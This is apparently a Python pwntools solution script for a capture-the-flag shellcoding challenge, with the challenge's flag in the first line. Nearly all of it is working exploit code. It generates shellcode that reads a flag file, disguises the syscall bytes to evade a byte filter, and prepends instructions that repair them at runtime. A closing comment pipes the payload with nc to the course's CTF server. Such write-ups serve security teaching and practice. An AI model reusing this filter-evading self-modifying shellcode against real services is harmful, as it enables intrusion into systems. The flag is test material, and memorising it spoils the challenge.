# FLAG{5hellc0d1ng_f0r_5yscal1_:P}
from pwn import *
import pdb, operator

context(arch='amd64', os='linux', log_level='info')

class Instructions:
    def __init__(self):
        self._arr = []

    def append(self, ins):
        self._arr.append((ins, asm(ins)))

    def insert(self, index, ins):
        self._arr.insert(index, (ins, asm(ins)))

    def update(self, index, ins):
        self._arr[index] = (ins, asm(ins))

    def getoffset(self, index):
        offset = 0
        for i in range(index):
            offset += len(self.getmachinecode(i))
        return offset

    def getassembly(self, index):
        return self._arr[index][0]

    def getmachinecode(self, index):
        return self._arr[index][1]

    def __iter__(self):
        return map(operator.itemgetter(0), self._arr)

    def __len__(self):
        return len(self._arr)

    def __getattr__(self, index):
        return (self.getoffset(index),
                self.getassembly(index),
                self.getmachinecode(index))

text = Instructions()
for ins in shellcraft.cat('/home/shellc0de/flag', 1).strip().split('\n'):
    text.append(ins)
for ins in shellcraft.exit(0).strip().split('\n'):
    text.append(ins)

for i in range(len(text)):
    print(i, text.getoffset(i), text.getassembly(i), text.getmachinecode(i).hex())

# patch syscall instruction: 0x050f -> -20 -> 0x04fb
text._arr[12] = text._arr[21] = text._arr[26] = ('syscall (modified)', b'\xfb\x04')

# shellcode address: [rbp-0x110]
text.insert(0, 'mov ax, WORD PTR [rbp-0x110+68]')
text.insert(1, 'add ax, 20')
text.insert(2, 'mov WORD PTR [rbp-0x110+68], ax')
text.insert(3, 'mov WORD PTR [rbp-0x110+86], ax')
text.insert(4, 'mov WORD PTR [rbp-0x110+93], ax')

for i in range(len(text)):
    print(i, text.getoffset(i), text.getassembly(i), text.getmachinecode(i).hex())

shellcode = b''.join(text.getmachinecode(i) for i in range(len(text)))

print(b'\x00' in shellcode)
print(b'\x05' in shellcode)
print(b'\x0f' in shellcode)

open('shellc0de.payload', 'wb').write(shellcode)
# in shell:
# cat shellc0de.payload | nc edu-ctf.csie.org 10150
